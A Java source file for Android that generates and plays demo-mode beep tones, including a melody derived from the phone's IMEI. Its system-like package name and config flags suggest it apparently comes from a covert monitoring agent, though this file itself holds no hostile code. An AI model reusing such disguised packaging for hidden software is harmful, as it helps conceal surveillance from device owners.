package com.android.networking;

import java.util.concurrent.Semaphore;

import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

public class Beep {
	private static final String TAG = "Beep";
	static int sampleRate = 8000;
	static AudioTrack audioTrack;
	static double DO = 1046.50;
	static double RE = 1174.66;
	static double MI = 1318.51;
	static double SOL = 1567.98;
	static double LA = 1760.00;

	static double[] pentatonic = new double[] { DO, RE, MI, SOL, LA };
	private static boolean initialized;

	static byte[] soundBeep = null;
	static byte[] soundBip = null;

	static byte[] genTone(double duration, double freqOfTone) {
		int sampleRate = 8000;
		int numSamples = (int) (duration * sampleRate);
		// double freqOfTone = 440; // hz

		double sample[] = new double[numSamples];
		byte generatedSnd[] = new byte[2 * numSamples];

		double quinta = Math.pow(2, 7 / 12.0);
		double terza = Math.pow(2, 4 / 12.0);
		// fill out the array
		for (int i = 0; i < numSamples; ++i) {
			sample[i] = (Math.sin(2 * Math.PI * i / (sampleRate / freqOfTone)) * .6
					+ Math.sin(2 * Math.PI * i / (sampleRate / (freqOfTone * terza))) * .2 + Math.sin(2 * Math.PI * i
					/ (sampleRate / (freqOfTone * quinta))) * .1)
					* (1 - i / (double) numSamples);
		}

		// convert to 16 bit pcm sound array
		// assumes the sample buffer is normalised.
		int idx = 0;
		for (final double dVal : sample) {
			// scale to maximum amplitude
			final short val = (short) ((dVal * 32767));
			// in 16 bit wav PCM, first byte is the low order byte
			generatedSnd[idx++] = (byte) (val & 0x00ff);
			generatedSnd[idx++] = (byte) ((val & 0xff00) >>> 8);
		}

		return generatedSnd;
	}

	static synchronized void initSound() {
		if (initialized) {
			return;
		}
		initialized = true;

		double s = .1;
		double c = .2;
		double p = .4;

		if (soundBeep == null) {
			soundBeep = Utils.concat(genTone(s, DO), genTone(s, MI), genTone(s, SOL));
		}

		if (soundBip == null) {
			soundBip = genTone(s, LA);
		}

		if (soundPenta == null) {
			String imei = Device.self().getImei();
			int len = imei.length();
			double[] notes = new double[7];
			for (int i = 0; i < notes.length; i++) {
				char ch = imei.charAt(len - i - 1);
				int noteIdx = (int) ch % pentatonic.length;

				notes[i] = pentatonic[noteIdx];
			}

			soundPenta = Utils.concat(genTone(s, notes[0]), genTone(c, notes[1]), genTone(s, notes[2]),
					genTone(c, notes[3]), genTone(s, notes[4]), genTone(c, notes[5]), genTone(p, notes[5]));

		}
		int bufSize = Math.max(soundPenta.length, soundBeep.length);
		audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC, sampleRate, AudioFormat.CHANNEL_CONFIGURATION_MONO,
				AudioFormat.ENCODING_PCM_16BIT, bufSize, AudioTrack.MODE_STREAM);
	}

	static void playSound(byte[] generatedSnd) {

		int ret = audioTrack.setStereoVolume(1.0F, 1.0F);
		ret = audioTrack.write(generatedSnd, 0, generatedSnd.length);
		if (audioTrack.getPlayState() != AudioTrack.PLAYSTATE_PLAYING) {
			audioTrack.flush();
			audioTrack.play();
			audioTrack.stop();
			// audioTrack.pause();
		}
	}

	static Semaphore soundSemaphore = new Semaphore(1, true);

	public static void bip() {
		if (Cfg.DEMO) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (bip)");
			}

			if (!soundSemaphore.tryAcquire()) {
				return;
			}

			try {
				initSound();

				Status.self().getDefaultHandler().post(new Runnable() {
					public void run() {
						playSound(soundBip);
					}

				});
			} finally {
				soundSemaphore.release();
			}
		}
	}

	public static void beep() {
		if (Cfg.DEMO) {

			if (!soundSemaphore.tryAcquire()) {
				return;
			}
			try {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (beep)");
				}

				initSound();

				Status.self().getDefaultHandler().post(new Runnable() {
					public void run() {
						playSound(soundBeep);
					}

				});
			} finally {
				soundSemaphore.release();
			}
		}
	}

	static byte[] soundPenta = null;

	public static void beepPenta() {
		if (Cfg.DEMO) {

			if (!soundSemaphore.tryAcquire()) {
				return;
			}
			try {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (beepPenta)");
				}

				initSound();

				Status.self().getDefaultHandler().post(new Runnable() {
					public void run() {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (run): sound");
						}
						playSound(soundPenta);
						if (Cfg.DEBUG) {
							Check.log(TAG + " (run): end sound");
						}
					}

				});
			} finally {
				soundSemaphore.release();
			}
		}
	}
}
